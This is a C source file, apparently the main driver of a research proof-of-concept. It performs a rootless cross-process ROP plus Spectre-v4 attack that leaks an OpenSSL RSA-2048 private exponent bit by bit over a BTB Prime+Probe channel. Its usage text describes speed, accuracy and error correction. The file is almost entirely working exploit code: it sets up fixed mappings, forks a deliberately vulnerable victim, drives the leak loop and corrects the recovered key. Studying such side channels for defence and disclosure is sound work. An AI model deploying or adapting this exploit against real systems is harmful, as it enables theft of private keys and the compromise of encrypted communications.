// Rootless cross-process ROP + Spectre-v4 leak of an OpenSSL RSA-2048 private exponent (Neoverse N3).
// The victim (child) has a stack overflow and holds a real private key. The attacker (parent) drives
// its own libcrypto gadgets to leak d one bit at a time over a BTB channel. See README.md.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <time.h>
#include <signal.h>
#include <getopt.h>
#include <stdarg.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include "poc.h"
#include "victim.h"
#include "attacker.h"
#include "donor.h"
#include "scoring.h"

FILE *g_save = NULL;
void tee_printf(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    if (g_save) {
        va_start(ap, fmt);
        vfprintf(g_save, fmt, ap);
        va_end(ap);
    }
}

static void pin(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof set, &set);
}

static void map_fixed(uint64_t va, const char *what) {
    if (mmap((void *)va, 0x1000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
        perror(what);
        _exit(1);
    }
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    int cpu = 1;
    int samples = 1500;
    const char *savepath = NULL;
    enum { O_SAMPLES = 1000 };   // long-only (short -s is --save)
    static struct option opts[] = {
        {"samples", 1, 0, O_SAMPLES}, {"cpu", 1, 0, 'c'}, {"save", 1, 0, 's'}, {"help", 0, 0, 'h'}, {0, 0, 0, 0}
    };
    int opt = 0;
    while (-1 != (opt = getopt_long(argc, argv, "c:s:h", opts, 0))) {
        switch (opt) {
            case O_SAMPLES:
                samples = atoi(optarg);
                break;
            case 'c':
                cpu = atoi(optarg);
                break;
            case 's':
                savepath = optarg;
                break;
            default:
                printf("usage: %s [--samples N] [--cpu N] [--save FILE]\n"
                       "\n"
                       "Leaks the RSA-2048 private exponent d, one bit at a time, over a BTB Prime+Probe\n"
                       "channel. Each bit is decided by averaging many prime/probe measurements, then a\n"
                       "corrector closes up to 4 residual bit errors against the RSA inversion oracle.\n"
                       "\n"
                       "  --samples N  prime/probe iterations averaged per secret bit, the sole accuracy\n"
                       "               and speed knob (default 1500). Higher is more accurate and slower. At\n"
                       "               1500 the full 2048-bit d comes back at 99.95%% in about 3 hours\n"
                       "               (~0.19 bits/s), and the corrector recovers the exact exponent. This is\n"
                       "               a per-bit average, not a count of key leaks (d is leaked once).\n"
                       "  --cpu N      core to pin BOTH attacker and victim to (default 1); they must share a\n"
                       "               core so the per-core BTB is the shared channel. Use an isolated core.\n"
                       "  --save FILE  also write the per-limb progress and final recovery report to FILE\n"
                       "               (the terminal still shows everything). No env vars are used.\n",
                       argv[0]);
                return 0;
        }
    }
    if (samples < 1) {
        samples = 1;
    }
    if (savepath) {
        g_save = fopen(savepath, "w");
        if (!g_save) {
            perror("--save");
            return 1;
        }
        setvbuf(g_save, NULL, _IOLBF, 0);   // line-buffered: --save lands live and survives an interrupt
    }

    load_donor();
    resolve_syms();
    if (verify_gadgets()) {
        printf("!! gadgets\n");
        return 1;
    }
    donor_banner();

    map_fixed(SECBASE, "sec");
    map_fixed(M_VA, "M");
    map_fixed(A_VA, "A");
    map_fixed(SLOT_VA, "SLOT");
    map_fixed(PTRS_VA, "PTRS");
    *(volatile uint64_t *)(SLOT_VA) = A_VA - 32;   // OPENER's delayed store address (the v4 trigger)

    build_payload();
    pin(cpu);
    attacker_set_samples(samples);
    attacker_setup(donor_transmit_set(), donor_tail_set());

    signal(SIGPIPE, SIG_IGN);
    int pfd[2] = { 0 };
    int kfd[2] = { 0 };
    if (pipe(pfd) || pipe(kfd)) {
        perror("pipe");
        return 1;
    }
    pid_t pid = fork();
    if (pid == 0) {
        dup2(pfd[0], 0);
        close(pfd[0]);
        close(pfd[1]);
        close(kfd[0]);
        pin(cpu);
        srand(1);
        gen_secret();
        build_key();
        send_key_to_parent(kfd[1]);
        close(kfd[1]);
        call_vuln();   // never returns: the ROP loops it
        _exit(7);
    }
    close(pfd[0]);
    close(kfd[1]);
    attacker_bind_victim(pid, pfd[1]);
    recv_key_from_parent(kfd[0]);   // the calibration page the readout uses is the child's copy (main.c child branch)
    close(kfd[0]);

    tee_printf("rootless cross-proc ROP+v4 RSA-key leak  cpu=%d samples=%d  victim=%d\n", cpu, samples, pid);

    uint64_t calib_x0 = SECBASE | CALIB_OFF;
    for (int warmup = 0; warmup < 3; ++warmup) {
        leak_bit(SECBASE, 0, calib_x0);   // warm the victim loop and the channel
    }
    int killsig = 0;
    if (attacker_crashed(&killsig)) {
        printf("!! victim died during warmup (killsig=%d)\n", killsig);
        return 1;
    }

    int num_limbs = g_key_limbs;
    int transmit_set = donor_transmit_set();
    unsigned long *recovered_limbs = calloc((size_t)num_limbs, sizeof(unsigned long));
    double *bit_conf = calloc((size_t)num_limbs * 64, sizeof(double));
    long kbits = 0;
    long kbits_ok = 0;
    struct timespec k0 = { 0 };
    struct timespec k1 = { 0 };
    clock_gettime(CLOCK_MONOTONIC, &k0);
    tee_printf("KEYLEAK: leaking %d private-exponent limbs (%d bits) from %#lx over BTB set %d\n",
        num_limbs, num_limbs * 64, g_key_limbaddr, transmit_set);
    int crashed = 0;
    for (int limb = 0; limb < num_limbs && !crashed; ++limb) {
        uint64_t limbaddr = g_key_limbaddr + (uint64_t)limb * 8;
        unsigned long limb_value = 0;
        for (int bit = 0; bit < 64; ++bit) {
            int bit_value = leak_bit(limbaddr, (uint64_t)bit, calib_x0);
            if (attacker_crashed(&killsig)) {
                crashed = 1;
                break;
            }
            bit_conf[limb * 64 + bit] = attacker_bit_margin();
            limb_value |= ((unsigned long)(bit_value & 1)) << bit;
            kbits++;
            if (bit_value == (int)((g_key_truth[limb] >> bit) & 1UL)) {
                kbits_ok++;
            }
        }
        recovered_limbs[limb] = limb_value;
        tee_printf("  limb[%2d] leaked=%016lx truth=%016lx %s\n", limb, limb_value, g_key_truth[limb],
            (limb_value == g_key_truth[limb]) ? "OK" : "XX");
    }
    clock_gettime(CLOCK_MONOTONIC, &k1);
    double wall = (k1.tv_sec - k0.tv_sec) + (k1.tv_nsec - k0.tv_nsec) / 1e9;
    int limbs_ok = 0;
    for (int limb = 0; limb < num_limbs; ++limb) {
        if (recovered_limbs[limb] == g_key_truth[limb]) {
            limbs_ok++;
        }
    }
    tee_printf("\n==== KEYLEAK AGGREGATE ====\n  bits %ld/%ld = %.2f%%   limbs %d/%d exact   wall=%.2fs  %.3f bits/s\n",
        kbits_ok, kbits, kbits ? 100.0 * kbits_ok / kbits : 0.0, limbs_ok, num_limbs, wall, wall > 0 ? kbits / wall : 0.0);

    int max_errors = 4;
    int corrected = correct_key(recovered_limbs, num_limbs, bit_conf, max_errors);
    if (corrected == 0) {
        tee_printf("  corrector: exponent already exact, 0 bit-flips\n");
    } else if (corrected > 0) {
        tee_printf("  corrector: %d residual bit%s corrected via RSA inversion oracle\n",
            corrected, corrected == 1 ? "" : "s");
    } else {
        tee_printf("  corrector: residual errors beyond the %d-bit search, exact exponent not recovered\n", max_errors);
    }
    verify_key(recovered_limbs, num_limbs);

    if (!crashed) {
        kill(pid, SIGKILL);
        waitpid(pid, 0, 0);
    }
    if (g_save) {
        fclose(g_save);
    }
    return 0;
}
